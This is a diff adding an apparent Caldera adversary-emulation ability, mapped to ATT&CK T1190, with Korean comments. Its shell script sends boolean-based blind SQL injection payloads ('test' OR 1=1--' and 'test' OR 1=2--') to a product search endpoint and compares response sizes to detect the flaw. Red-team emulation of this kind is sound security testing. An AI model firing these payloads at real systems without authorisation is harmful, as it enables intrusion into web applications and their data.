@@ -1,0 +1,42 @@
+- id: 33c4d5e6-7f8a-4901-acde-f01234567003
+  name: Blind SQL Injection - Boolean-Based
+  description: OR 1=1 (true) / OR 1=2 (false) 분기를 이용한 블라인드 SQLi. test 토큰 + OR 결합으로 분기 차이를 발생시켜 응답 길이 차이를 만듭니다.
+  tactic: initial-access
+  technique:
+    attack_id: T1190
+    name: Exploit Public-Facing Application
+  platforms:
+    linux:
+      sh:
+        command: |-
+          OP_ID="#{operation_id}"
+          TECH_ID="T1190"
+          ABILITY_ID="33c4d5e6-7f8a-4901-acde-f01234567003"
+          TARGET="http://#{target.url}"
+
+          CURL_BASE=( -s -w "%{size_download}" -o /dev/null
+                      -H "X-Caldera-Op-Id: ${OP_ID}"
+                      -H "X-Caldera-Technique: ${TECH_ID}"
+                      -H "X-Caldera-Ability: ${ABILITY_ID}"
+                      -A "Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}" )
+
+          echo "[*] Boolean-Based Blind SQLi"
+
+          echo "[>] TRUE  분기 (test' OR 1=1--):"
+          SIZE_TRUE=$(curl "${CURL_BASE[@]}" \
+            "${TARGET}/api/products/search?keyword=test%27+OR+1%3D1--")
+          echo "    SIZE=${SIZE_TRUE}"
+
+          echo "[>] FALSE 분기 (test' OR 1=2--):"
+          SIZE_FALSE=$(curl "${CURL_BASE[@]}" \
+            "${TARGET}/api/products/search?keyword=test%27+OR+1%3D2--")
+          echo "    SIZE=${SIZE_FALSE}"
+
+          # SIZE 차이로 분기 결과 판별
+          if [ "${SIZE_TRUE}" -gt "${SIZE_FALSE}" ] 2>/dev/null && \
+             [ $((SIZE_TRUE - SIZE_FALSE)) -gt 100 ]; then
+            echo "[+] 분기 차이 검출 (Δ=$((SIZE_TRUE - SIZE_FALSE)) bytes)"
+            echo "[+] Boolean-Based Blind SQLi 성공"
+          else
+            echo "[-] 분기 차이 미검출 - 페이로드 검토 필요"
+          fi
